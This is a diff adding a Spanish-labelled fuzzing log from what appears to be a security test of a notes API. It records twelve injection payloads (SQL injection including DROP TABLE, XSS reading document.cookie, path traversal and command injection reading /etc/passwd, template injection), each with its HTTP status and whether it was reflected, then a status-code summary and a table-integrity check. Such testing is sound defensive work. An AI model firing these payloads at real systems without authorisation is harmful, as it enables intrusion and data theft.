@@ -1,0 +1,18 @@
+1   ' OR '1'='1                           HTTP 201    114ms  reflejado:si
+2   '; DROP TABLE notes;--                HTTP 201     10ms  reflejado:si
+3   1' UNION SELECT NULL;NULL;NULL--      HTTP 201     12ms  reflejado:si
+4   <script>alert(document.cookie)</scr   HTTP 201     11ms  reflejado:si
+5   <img src=x onerror=alert(1)>          HTTP 201     12ms  reflejado:si
+6   javascript:alert(1)                   HTTP 201     12ms  reflejado:si
+7   ../../../../etc/passwd                HTTP 201     11ms  reflejado:si
+8   $(id)                                 HTTP 201     11ms  reflejado:si
+9   ; cat /etc/passwd                     HTTP 201     11ms  reflejado:si
+10  {{7*7}}                               HTTP 201     11ms  reflejado:si
+11  %00                                   HTTP 201     11ms  reflejado:si
+12  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA   HTTP 500     10ms  reflejado:no
+--- resumen por código HTTP ---
+     11 201
+      1 500
+--- integridad de la tabla tras los payloads SQL ---
+la tabla notes sigue respondiendo
+resultados en evidencias/fuzzing-resultados.csv
